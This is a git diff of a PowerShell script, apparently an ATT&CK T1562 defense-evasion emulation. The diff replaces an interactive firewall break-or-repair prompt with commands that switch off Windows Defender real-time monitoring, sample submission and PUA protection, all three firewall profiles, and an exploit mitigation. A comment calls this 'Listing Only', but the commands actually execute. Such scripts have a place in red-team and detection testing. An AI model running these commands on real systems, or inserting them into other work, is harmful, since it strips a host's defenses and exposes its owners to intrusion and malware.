@@ -1,19 +1,46 @@
-Write-Host "This script will bypass the firewall state = Defense Evasion (ATT&CK ID: T1562):"
-Write-Host "Processing..."
+# Start a job that runs your script
+$job = Start-Job -ScriptBlock {
 
-# Prompt the user for input
-$choice = Read-Host "Do you want to break or repair the firewall? (Type 'break' or 'repair' and press Enter)"
+    Start-Sleep -Seconds 1
+    
+}
 
-# Condition 1: Break Firewall
-if ($choice -eq "break") {
-    netsh advfirewall set currentprofile state off
-    Write-Host "Firewall state has been turned off."
+
+Start-Sleep -Seconds 0.11
+  
+
+# Disable Windows Security Features (Listing Only)
+
+# Disable Real-time Protection
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Disable Automatic Sample Submission
+Set-MpPreference -MAPSReporting 0
+
+# Disable Domain Firewall
+Set-NetFirewallProfile -Profile Domain -Enabled False
+
+# Disable Private Firewall
+Set-NetFirewallProfile -Profile Private -Enabled False
+
+# Disable Public Firewall
+Set-NetFirewallProfile -Profile Public -Enabled False
+
+# Disable Reputation-based Protection
+Set-MpPreference -PUAProtection 0
+
+# Disable Exploit Protection
+try {
+    Set-ProcessMitigation -Disable ForceRelocateImages
+} catch {
+    Write-Host "Failed to disable Exploit Protection: $_"
 }
-# Condition 2: Repair Firewall
-elseif ($choice -eq "repair") {
-    netsh advfirewall set currentprofile state on
-    Write-Host "Firewall state has been turned on."
-}
-else {
-    Write-Host "Invalid option. Please specify 'break' to turn off firewall or 'repair' to turn it on."
+
+# Display the status of security features
+Get-MpPreference
+Get-NetFirewallProfile
+try {
+    Get-ProcessMitigation
+} catch {
+    Write-Host "Failed to get Process Mitigation: $_"
 }
